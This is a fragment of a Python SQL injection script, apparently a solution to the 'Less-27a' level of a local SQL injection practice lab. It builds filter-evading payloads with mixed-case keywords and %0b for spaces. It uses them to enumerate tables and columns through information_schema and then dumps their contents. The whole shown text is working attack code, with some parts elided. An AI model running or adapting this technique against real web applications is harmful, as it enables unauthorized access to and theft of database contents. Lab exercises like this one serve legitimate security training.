...
get_column = "(seLect group_concat(column_name) from information_schema.columns where table_name='{0}')".replace(
    ' ', '%0b')
get_secret = "(seLect group_concat({0}) from {1})".replace(' ', '%0b')
url = "http://localhost:1234/Less-27a/?id="
...
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[576:-300-len(payload.format(get_table))]
tables = temp.split(',')
print("Tables :", *tables)
for i in tables:
    print("From Table", i, ": ")
    ...
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[576:-300-len(payload.format(find))]
    columns = temp.split(',')
    ...
    for j in columns:
        ...
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[576:-304-len(payload.format(find))])
